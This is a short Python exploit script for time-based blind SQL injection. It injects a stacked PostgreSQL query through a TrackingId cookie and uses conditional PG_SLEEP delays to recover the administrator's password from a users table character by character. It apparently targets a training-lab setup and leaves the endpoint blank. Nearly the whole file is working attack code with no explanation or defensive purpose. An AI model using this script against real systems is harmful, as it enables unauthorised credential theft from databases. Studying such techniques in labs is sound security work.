import requests
import urllib.parse
import string

endpoint = ""
delay = 20

def sqli(payload):

    headers = {
        'Cookie': f"session=test;TrackingId=test{payload}"
    }
    # print(headers)

    response = requests.get(endpoint, headers=headers)
    return response.elapsed.total_seconds() > delay


def retrieve_password_char(password):

    current_index = len(password) + 1

    for c in string.printable:

        ascii_code = ord(c)
        condition = f"username='administrator' AND ASCII(SUBSTRING(password,{current_index},1))={ascii_code}"
        payload = f"'%3bSELECT CASE WHEN ({condition}) THEN PG_SLEEP({delay}) ELSE PG_SLEEP(0) END FROM users--"
        # print(payload)

        if sqli(payload):
            return c
        else:
            pass

    return None


def retrieve_password():

    password = ""

    while True:

        password_char = retrieve_password_char(password)

        if password_char is None:
            break

        print(f"[+] Found char: {password_char}")
        password += password_char

    print(f"[+] Found password: {password}")


def main():

    retrieve_password()


if __name__ == '__main__':
    main()
